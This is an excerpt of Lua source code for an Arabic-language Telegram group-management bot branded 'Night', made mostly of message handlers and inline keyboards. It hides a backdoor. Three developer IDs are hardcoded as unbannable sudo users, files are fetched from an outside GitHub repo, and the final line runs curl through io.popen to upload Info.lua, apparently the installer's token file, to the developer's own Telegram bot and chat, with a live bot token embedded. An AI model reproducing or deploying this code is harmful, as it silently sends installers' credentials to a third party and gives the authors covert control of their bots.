...
sudo_users = {SUDO,1836501705,1874048901,1634565473}   
...
if tonumber(user_id) == tonumber(1836501705) then  
var = true  
elseif tonumber(user_id) == tonumber(1874048901) then
var = true  
elseif tonumber(user_id) == tonumber(1634565473) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝙉𝙄𝙂𝙃𝙏 ")  
...
{{text = '𝙉𝙄𝙂𝙃𝙏 ', url="t.me/B_TRR"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '⩹━━━━━━ 𝙉𝙄𝙂𝙃𝙏  ━━━━━━⩺' or text == '⩹━━━━━━ 𝙉𝙄𝙂𝙃𝙏  ━━━━━━⩺' or text == '⩹━━━━━━ 𝙉𝙄𝙂𝙃𝙏  ━━━━━━⩺' or text == '"' then
local Text =[[
تواصل السورس ☑️
]]
keyboard = {} 
...
{
{text = '۞  مبرمج ومطور السورس  ۞ ', url = "https://t.me/Jiiiiiii1"},
},
{
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ALP_ALEX1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[  
╭────  [ ⌯ 𝙒𝙧 𝙎𝙞𝙧𝙞𝙖  ⌯   ](t.me/siria22)  ────╮

۞          [اهلان في سورس نايت🌑    ](t.me/B_TRR)    ۞
             
╰────  [ 𝒂𝒍𝒆𝒙  ꪝ   ](t.me/Jiiiiiii1)  ────╯
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '⌯مبرمج السورس ⌯',url="t.me/Jiiiiiii1"}},  
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '⌯اليكــس⌯',url="t.me/Jiiiiiii1"}},  
} 
local msg_id = msg.id_/2097152/0.5 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Jiiiiiii1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if tonumber(result.sender_user_id_) == tonumber(1874048901) then  
send(msg.chat_id_, msg.id_, " ⌯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1634565473) then  
send(msg.chat_id_, msg.id_, " ⌯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1874048901) then
...
if result.id_ == tonumber(1634565473) then
send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1874048901) then  
send(msg.chat_id_, msg.id_, " ⌯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(1634565473) then  
send(msg.chat_id_, msg.id_, " ⌯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
local json_file, res = https.request("https://raw.githubusercontent.com/exalex200/EX/main/File_Bot/"..file)
if res == 200 then
...
'اسمي  '..Namebot..' كابوس الكلاب الي عمرو مهاب🦇 ',
...
local Text =[[
╭────  [ 𝒂𝒍𝒆𝒙  𝒕𝒆𝒂𝒎 ꪝ   ](t.me/B_TRR)  ────╮

۞ [ مبرمج السورس   ](t.me/Jiiiiiii1) ۞
             
╰────  [ 𝒂𝒍𝒆𝒙  𝒕𝒆𝒂𝒎 ꪝ  ](t.me/B_TRR)  ────╯

[۞ قناه السورس ۞ ](t.me/B_TRR)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local curl = 'curl "'..'https://api.telegram.org/bot1796143590:AAG7xMmzOdxe_8BlKg-dYP1tfedX1ZY-3ng/sendDocument'..'" -F "chat_id='.. 1874048901 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
